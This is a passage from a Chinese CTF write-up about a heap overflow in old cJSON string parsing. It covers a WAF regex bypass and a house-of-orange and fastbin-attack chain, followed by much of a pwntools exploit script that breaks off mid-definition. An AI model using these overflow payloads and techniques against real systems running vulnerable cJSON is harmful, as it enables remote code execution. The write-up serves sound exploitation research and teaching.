@@ -1,0 +1,710 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="5328d500f458a61aec1a8e89c21cfa78">Chinese Version</h2>
+<h3 data-content="1" id="4c5d4e930c5f89bb48ab4be830fb4923">背景</h3>
+<p>题目的出题灵感来源于笔者在对某大规模部署产品进行分析时发现的一个较难利用的堆漏洞。在完成完整利用的过程中，笔者第一次在实战场景组合使用了一些CTF赛题中用到的堆利用技巧。本篇文章会以题目writeup的形式介绍该漏洞的成因及利用技巧。感谢@M4x实现题目相关代码。</p>
+<p><a href="https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/Corrupted%20GI" target="_blank">题目信息</a></p>
+<h3 data-content="1" id="a670d31227938a013139af5c402ead75">漏洞成因</h3>
+<p>该漏洞存在于一个开源项目 <a href="https://github.com/DaveGamble/cJSON" target="_blank"><code>cJSON</code></a> 中。在较早版本的<code>cJSON</code>代码中，解析json中的字符串时会通过以下函数实现：</p>
+<div class="highlight"><pre><span></span><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">parse_string</span><span class="p">(</span><span class="n">cJSON</span> <span class="o">*</span><span class="n">item</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="o">=</span><span class="n">str</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr2</span><span class="p">;</span><span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">;</span><span class="kt">int</span> <span class="n">len</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="kt">unsigned</span> <span class="n">uc</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">str</span><span class="o">!=</span><span class="sc">'\"'</span><span class="p">)</span> <span class="p">{</span><span class="n">ep</span><span class="o">=</span><span class="n">str</span><span class="p">;</span><span class="k">return</span> <span class="mi">0</span><span class="p">;}</span>  <span class="cm">/* not a string! */</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">!=</span><span class="sc">'\"'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="n">len</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">==</span> <span class="sc">'\\'</span><span class="p">)</span> <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>  <span class="cm">/* Skip escaped quotes. */</span>
+
+    <span class="n">out</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cJSON_malloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="cm">/* This is how long we need for the string, roughly. */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">ptr</span><span class="o">=</span><span class="n">str</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="n">ptr2</span><span class="o">=</span><span class="n">out</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">!=</span><span class="sc">'\"'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">!=</span><span class="sc">'\\'</span><span class="p">)</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+            <span class="k">switch</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="k">case</span> <span class="sc">'b'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\b'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'f'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\f'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'n'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\n'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'r'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\r'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'t'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\t'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'u'</span><span class="o">:</span>    <span class="cm">/* transcode utf16 to utf8. DOES NOT SUPPORT SURROGATE PAIRS CORRECTLY. */</span>
+                    <span class="n">sscanf</span><span class="p">(</span><span class="n">ptr</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s">"%4x"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>    <span class="cm">/* get the unicode char. */</span>
+                    <span class="n">len</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span><span class="n">uc</span><span class="o">&lt;</span><span class="mh">0x80</span><span class="p">)</span> <span class="n">len</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">uc</span><span class="o">&lt;</span><span class="mh">0x800</span><span class="p">)</span> <span class="n">len</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span><span class="n">ptr2</span><span class="o">+=</span><span class="n">len</span><span class="p">;</span>
+
+                    <span class="k">switch</span> <span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> <span class="o">*--</span><span class="n">ptr2</span> <span class="o">=</span><span class="p">((</span><span class="n">uc</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xBF</span><span class="p">);</span> <span class="n">uc</span> <span class="o">&gt;&gt;=</span> <span class="mi">6</span><span class="p">;</span>
+                        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="o">*--</span><span class="n">ptr2</span> <span class="o">=</span><span class="p">((</span><span class="n">uc</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xBF</span><span class="p">);</span> <span class="n">uc</span> <span class="o">&gt;&gt;=</span> <span class="mi">6</span><span class="p">;</span>
+                        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="o">*--</span><span class="n">ptr2</span> <span class="o">=</span><span class="p">(</span><span class="n">uc</span> <span class="o">|</span> <span class="n">firstByteMark</span><span class="p">[</span><span class="n">len</span><span class="p">]);</span>
+                    <span class="p">}</span>
+                    <span class="n">ptr2</span><span class="o">+=</span><span class="n">len</span><span class="p">;</span><span class="n">ptr</span><span class="o">+=</span><span class="mi">4</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="k">default</span><span class="o">:</span>  <span class="o">*</span><span class="n">ptr2</span><span class="o">++=*</span><span class="n">ptr</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="o">*</span><span class="n">ptr2</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">==</span><span class="sc">'\"'</span><span class="p">)</span> <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">item</span><span class="o">-&gt;</span><span class="n">valuestring</span><span class="o">=</span><span class="n">out</span><span class="p">;</span>
+    <span class="n">item</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">=</span><span class="n">cJSON_String</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>可以发现，代码主要有以下步骤：</p>
+<ul>
+<li>1 计算字符串长度（通过寻找第二个<code>"</code>来计算）</li>
+<li>2 申请内存</li>
+<li>3 将字符写入内存（如果需要解码则进行解码）</li>
+</ul>
+<p>而在解码过程中，当遇到<code>'\u'</code>时，最终会执行<code>ptr+=4</code>。如果<code>ptr+4</code> 跳过的字节里，恰好有第一步计算长度时找到的第二个<code>"</code>，这时就可以产生一个堆溢出。攻击者在可以输入任意json字符串的情况下可以轻松的控制申请的内存大小及溢出的长度。</p>
+<h3 data-content="1" id="9cf83c41156d3738e960f763d423d621">漏洞利用</h3>
+<p>完成利用主要有以下几个难点：</p>
+<ul>
+<li>需要绕过waf过滤（我们模拟了实际场景中存在的waf场景）</li>
+<li>在解析json的过程中没有free，且不存在堆上可用的内存指针或函数指针</li>
+</ul>
+<p>第一点带来的主要问题是payload的长度是有限制的，攻击者需要使用较短的payload申请大量堆内存，为后续利用做准备。通过逆向或者阅读cjson的代码可以发现通过数组（[1,1,....]）可以用很短的payload申请大量的内存。但waf中同时使用正则表达式"\"\s<em>:\s</em>\["过滤了数组。绕过这条规则使用了cjson和pcre2的一个解析差异，cjson中会使用自定义的skip函数跳过所有≤0x20的字符</p>
+<div class="highlight"><pre><span></span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">skip</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">in</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">in</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">in</span> <span class="o">&lt;=</span> <span class="mh">0x20u</span> <span class="p">)</span>
+    <span class="o">++</span><span class="n">in</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">in</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>而pcre2的\s只会匹配空白字符（\n, \r, \t, 空格等），因此只需要用二者之间差集中的特殊字符即可绕过正则规则，同时能使用数组，如"a:\x01[1,1]"</p>
+<p>针对第二点，需要使用<code>house of orange</code>。<code>house of orange</code>是在2016 HITCON CTF Quals中出现的堆利用技巧。攻击者通过该技巧可以在程序本身无法触发free的情况下，通过一系列堆布局，最终使glibc堆管理器将某块堆内存释放。你可以阅读<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c" target="_blank">how2heap的例子</a>或者其他文章来学习该技巧。</p>
+<p>笔者这里用几个简单的图来说明针对该题目如何通过<code>house of orange</code>构造一个<code>fastbin attack</code>。</p>
+<ul>
+<li>json允许字典，数组等形式传递数据。<code>cJSON</code>中针对数组的每一项都需要申请单独的内存。因此我们可以通过大量数组的形式去分配大量内存，使top chunk变得足够小</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151157-dad58cd4-bf3e-1.png"/></p>
+<ul>
+<li>之后申请一块大内存，使topchunk无法满足要求导致被释放（<code>house of orange</code>）</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151236-f1c4f042-bf3e-1.png"/></p>
+<ul>
+<li>重复以上步骤，再次构造一个free chunk</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151253-fc29e8d0-bf3e-1.png"/></p>
+<ul>
+<li>申请第一个free chunk，通过漏洞溢出到第二个free chunk，构造fastbin attack</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151309-05afcbcc-bf3f-1.png"/></p>
+<p>通过以上方式可以构造一个<code>fastbin attack</code>。之后可以通过<code>fastbin attack</code>去修改data段的函数指针,跳转到ROP最终完成利用（PS：这里很有趣的一点是，如果没有protobuf存储在data段上的函数指针，在开启Full RELRO的情况下也无法完成利用）</p>
+<p>完整的利用脚本如下：</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"amd64"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+
+<span class="c1"># POST /cgi-bin/login.cgi HTTP/1.1</span>
+<span class="c1"># Accept: application/json, */*</span>
+<span class="c1"># Accept-Encoding: gzip, deflate</span>
+<span class="c1"># Connection: keep-alive</span>
+<span class="c1"># Content-Length: 171</span>
+<span class="c1"># Content-Type: application/json</span>
+<span class="c1"># Host: 192.168.64.135:8080</span>
+<span class="c1"># User-Agent: HTTPie/1.0.3</span>
+<span class="c1"># </span>
+<span class="c1"># {"data": "BICWCZDNNFXBEK3IOR2HA4Z2F4XXO53XFZ4W65LUOVRGKLTDN5WS653BORRWQP3WHUWVC4LQIV3E4MSYMQ4BQAQ", "timestamp": 61866, "data": "aaaa\u" aaaaaaaabaaaaaaacaaaaaaadaaaaaaa"}</span>
+
+<span class="n">blacklist_dict</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\b</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">b"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\f</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">f"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">n"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">r"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">t"</span><span class="p">,</span>
+
+    <span class="sa">b</span><span class="s2">";"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u003b"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"$"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0024"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"|"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u007c"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"`"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0060"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"&amp;"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0026"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"#"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0023"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"("</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0028"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">")"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0029"</span><span class="p">,</span>
+
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0000"</span><span class="p">,</span>
+    <span class="c1"># bash, flag, cat, tcp</span>
+<span class="p">}</span>
+
+
+
+<span class="k">def</span> <span class="nf">get_raw_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="c1"># breakpoint()</span>
+    <span class="n">raw_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"latin"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist_dict</span><span class="p">:</span>
+            <span class="n">raw_payload</span> <span class="o">+=</span> <span class="n">blacklist_dict</span><span class="p">[</span><span class="n">c</span><span class="p">]</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">raw_payload</span> <span class="o">+=</span> <span class="n">c</span>
+
+    <span class="k">return</span> <span class="n">raw_payload</span>
+
+<span class="k">def</span> <span class="nf">calc_array_pair_cnt</span><span class="p">(</span><span class="n">required_size</span><span class="p">,</span> <span class="n">message_len</span><span class="p">):</span>
+    <span class="n">align_up_0x10</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xf</span>
+    <span class="n">remain_chunk_length</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x10</span>
+
+    <span class="n">string_len</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">n</span> <span class="o">+</span> <span class="n">message_len</span> <span class="c1"># 1,1,</span>
+    <span class="n">calc</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="mh">0x50</span> <span class="o">*</span> <span class="n">n</span> <span class="o">+</span> <span class="n">align_up_0x10</span><span class="p">(</span><span class="n">string_len</span><span class="p">(</span><span class="n">n</span><span class="p">))</span> <span class="o">+</span> <span class="n">remain_chunk_length</span><span class="p">(</span><span class="n">string_len</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">):</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="n">calc</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">required_size</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="n">required_size</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># breakpoint()</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">calc</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"required size too big"</span><span class="p">)</span>
+
+
+
+<span class="k">def</span> <span class="nf">generate_array_payload</span><span class="p">(</span><span class="n">required_size</span><span class="p">,</span> <span class="n">message_len</span><span class="p">):</span>
+    <span class="sd">'''</span>
+<span class="sd">    gdb-peda$ parseheap</span>
+<span class="sd">    addr      ... size ...</span>
+<span class="sd">    0x1cf0000 ... 0x?? ...    strlen(http_message) // </span>
+<span class="sd">    0x1cf0090 ... 0x50 ...    cJSON_Object root     </span>
+<span class="sd">    0x1cf00e0 ... 0x50 ...    cJSON_String data string</span>
+<span class="sd">    0x1cf0130 ... 0x20 ...    strlen("data")</span>
+<span class="sd">    0x1cf0150 ... 0x60 ...    strlen(data string)</span>
+<span class="sd">    0x1cf01b0 ... 0x50 ...    cJSON_String  timestamp</span>
+<span class="sd">    0x1cf0200 ... 0x20 ...    strlen("timestamp")</span>
+<span class="sd">    0x1cf0220 ... 0x50 ...    cJSON_Array timestamp</span>
+<span class="sd">    0x1cf0270 ... 0x20 ...    strlen("timestamp")</span>
+<span class="sd">    '''</span>
+    <span class="c1"># breakpoint()</span>
+    <span class="n">N</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">calc_size</span> <span class="o">=</span> <span class="n">calc_array_pair_cnt</span><span class="p">(</span><span class="n">required_size</span><span class="p">,</span> <span class="n">message_len</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'1,'</span> <span class="o">*</span> <span class="n">N</span> <span class="c1"># 0x50 chunk</span>
+    <span class="c1"># payload = payload.rstrip(b",")</span>
+    <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x01</span><span class="s1">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">required_size</span> <span class="o">-</span> <span class="n">calc_size</span><span class="p">)</span>
+    <span class="c1"># print("required_size {:#x} message_len {:#x} N {:#x} payload_len {:#x}".format(required_size, message_len, N, len(payload)))</span>
+    <span class="c1"># print(b"payload: %b" % payload)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+
+
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">)</span>
+
+    <span class="n">json_template</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'''</span>
+<span class="s1">    {"data":"BICWCZDNNFXBEK3IOR2HA4Z2F4XXO53XFZ4W65LUOVRGKLTDN5WS653BORRWQP3WHUWVC4LQIV3E4MSYMQ4BQAQ","timestamp":61866,"timestamp":</span><span class="se">\x11</span><span class="s1">[%b]}</span>
+<span class="s1">    '''</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="c1"># print(json_template, len(json_template) - 2)</span>
+    <span class="n">template_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">json_template</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span> <span class="c1"># 2: %b, 1: content_length + 1</span>
+    <span class="n">top_chunk_size</span> <span class="o">=</span> <span class="mh">0x20e00</span> <span class="o">+</span> <span class="mh">0x2000</span> <span class="c1"># why 0x2000?</span>
+
+    <span class="n">raw_len</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">get_raw_payload</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+
+    <span class="c1"># array_payload|overflow_old_top_chunk_payload|free_old_top_chunk_payload|overflow_new_top_chunk_payload|free_new_top_chunk_payload|overflow_fastbin_fd_payload|dummy_alloc_payload|hijack_payload</span>
+
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"aaaaaaaaaaaaa\u"   '</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'0'</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># prev_size of old top_chunk</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1"># 0x1041 -&gt; 0x41</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("overflow_old_top_chunk_payload len {:#x}, raw_len {:#x}".format(len(overflow_old_top_chunk_payload), raw_len(overflow_old_top_chunk_payload)))</span>
+
+
+    <span class="c1"># free_old_top_chunk_payload = b",1" # 0x50 chunk, we don't need this step because the next cJSON_String will do this happily</span>
+
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"bbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u"   '</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'1'</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># prev_size of new top_chunk</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x61</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0x0000000000021f81 -&gt; 0x00000000000000b1, save bytes as much as possible</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("overflow_new_top_chunk_payload len {:#x}, raw_len {:#x}".format(len(overflow_new_top_chunk_payload), raw_len(overflow_new_top_chunk_payload)))</span>
+
+    <span class="c1"># malloc(0x60 - 0x10)</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'2'</span> <span class="o">*</span> <span class="mh">0x50</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("free_new_top_chunk_payload len {:#x}, raw_len {:#x}".format(len(free_new_top_chunk_payload), raw_len(free_new_top_chunk_payload)))</span>
+
+    <span class="c1"># reclaim small bin and overflow fastbin</span>
+    <span class="c1"># for k in blacklist_dict:</span>
+    <span class="c1">#     assert k not in shellcode, "invalid char {}:{} in shellcode".format(shellcode.find(k), k)</span>
+
+    <span class="c1"># for k in [b"bash", b"flag", b"cat", b"tcp"]:</span>
+    <span class="c1">#     assert k not in shellcode, "invalid sequence {} in shellcode".format(k)</span>
+
+
+    <span class="c1"># assert len(shellcode) &lt;= 0x1100 - 0x8</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"ccccccccccccc\u"   '</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'3'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1100</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1"># size of fastbin</span>
+    <span class="sd">'''</span>
+<span class="sd">    gdb-peda$ x/20gx 0x676020-8+2</span>
+<span class="sd">    0x67601a:       0x51e8000000000000      0x51f0000000000045</span>
+<span class="sd">    '''</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x67601a</span><span class="p">)</span> <span class="c1"># fake fd, use p32 instead of p64 to save bytes</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("overflow_fastbin_fd_payload len {:#x}, raw_len {:#x}".format(len(overflow_fastbin_fd_payload), raw_len(overflow_fastbin_fd_payload)))</span>
+
+    <span class="n">dummy_alloc_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"'</span>
